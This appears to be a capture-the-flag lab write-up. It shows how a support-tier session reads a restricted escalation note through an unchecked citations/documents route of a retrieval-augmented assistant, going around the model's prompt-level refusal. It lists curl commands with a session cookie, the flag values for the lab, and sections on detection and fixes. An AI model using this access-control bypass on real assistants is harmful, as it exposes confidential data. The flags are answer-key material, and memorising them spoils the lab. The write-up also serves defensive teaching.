## Objective

> Recover the support engineer's private escalation note about ARWC from the assistant's case context,
> although the assistant's ordinary support role should withhold it.

The note is `ESC-SUP-2841-R3.md`, marked restricted, written by the engineer handling the ARWC
callback-latency case; the assistant, asked directly, is supposed to refuse.

## Background you need

A retrieval-augmented answer has two parts: `answer = model(citations)` and the `sources` array
(`{reference, text}` per chunk) the UI renders. Sources are populated from the retrieval layer
**before** the model applies policy. Consequences:

- the answer can be redacted while `sources` remain raw;
- a document route serving "the sources for conversation X, document Y" needs its own authorization;
  if it only checks "does the caller have the support overlay", the note's classification is never
  evaluated;
- ids are guessable or published by `/api/config` and `/api/contexts` (K21.1, K23.1).

A policy in the prompt is a *generation-time* filter; reading citations is a *storage-time* read —
different trust boundaries, and only one was implemented.

## Walkthrough

### 1. Establish the overlay session, then ask properly (and watch it refuse)

```bash
C="Cookie: fieldkest_support=fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b"

curl -sS -H "$C" -H 'Content-Type: application/json' -X POST \
  -d '{"request":"private_escalation","context_id":"ctx-support-private-v4",
       "conversation_id":"CONV-SUP-2841-19","tenant_id":"TEN-ARWC-047"}' \
  https://assistant.keplerops.test/api/answers
# 502 {"error":"retrieval_failed"}

curl -sS -H "$C" -H 'Content-Type: application/json' -X POST \
  -d '{"context_id":"ctx-support-private-v4"}' \
  https://assistant.keplerops.test/api/completions/context
# 403 {"error":"context_ownership_denied"}
```

Both *do* enforce something — the answer route fails closed, the completion route checks ownership.
The platform has the concept; it just does not apply it to the document route. So go around the model
and read the citations directly:

### 2. Read the citations

```bash
curl -sS -H "$C" --max-time 90 \
  'https://assistant.keplerops.test/api/contexts/ctx-support-private-v4/conversations/CONV-SUP-2841-19/documents/DOC-RILL-442' \
  | jq '.sources[] | {reference, text}'
```

`sources[]` returns the retrieved documents in full: `ESC-SUP-2841-R3.md` as **two copies** (original
and updated) plus `COMP-JOB-17.md`. The private note is in the citation list of a conversation the
support role may open but not read.

The route is slow (42 s here): give `curl` a generous `--max-time`, or a timeout looks like a failure.

### 3. Extract the flag

The updated copy of the note carries the completion token; in the 1:43:16 PM version:
`Completion token: FLAG{0613dee9e717f1e3}`. Lane notes record that value for this card with the
submission accepted; the card entry stores none, so it is recorded as accepted/not recorded.

## Why this works (the vulnerability explained)

**The guardrail is in the wrong layer.** The policy is prompt text: "do not disclose restricted
escalation notes" — a constraint on the model's *output*. The document route bypasses the model and
returns retrieval evidence assembled before any policy question was asked.

**Authorisation is per-route, not per-object.** The route checks "is this a valid support overlay
session for this context/conversation", never "may this caller read *this document*" — the classic
IDOR shape where the parent is validated and the child is not.

**Why the note exists twice.** Duplicate copies are a normal artefact of a draft being edited; both
were indexed and come back. The newer one matters, and it is the one nobody classified.

The transferable rule: when generation and retrieval are separated, retrieval artefacts (sources,
citations, embeddings, cached chunks) inherit the classification of the most sensitive input and must
be authorised independently. "The model refuses" is a UX behaviour, not an access control.

## Detection and fix

- **Log signal:** document reads whose id is not in the conversation's own citation set; restricted
  notes read by support-tier sessions; one document read across different contexts (the K23.3 signature).
- **Fix:** authorise each document at read time against caller role *and* classification; strip
  restricted documents from `sources[]` for non-privileged callers (keep the reference, drop the text);
  resolve documents by capability, not id; re-classify duplicates on edit. Move policy into the
  retrieval layer so one rule governs answer and citations.

## Notes and dead ends

- Working dead ends here: `POST /api/answers` → `502 retrieval_failed`;
  `POST /api/completions/context` → `403 context_ownership_denied`;
  `POST /api/tools/accept-duplicate-review` did not yield the note either.
- `ESC-SUP-2841-R3.md` also appears in K17/K19 material as the escalation *reference*; the reference
  and the note body are different objects, and this card needs the body.
- `COMP-JOB-17.md` in the same `sources[]` belongs to K24.1 (`FLAG{664724eb7d7073e9}`) — visible here
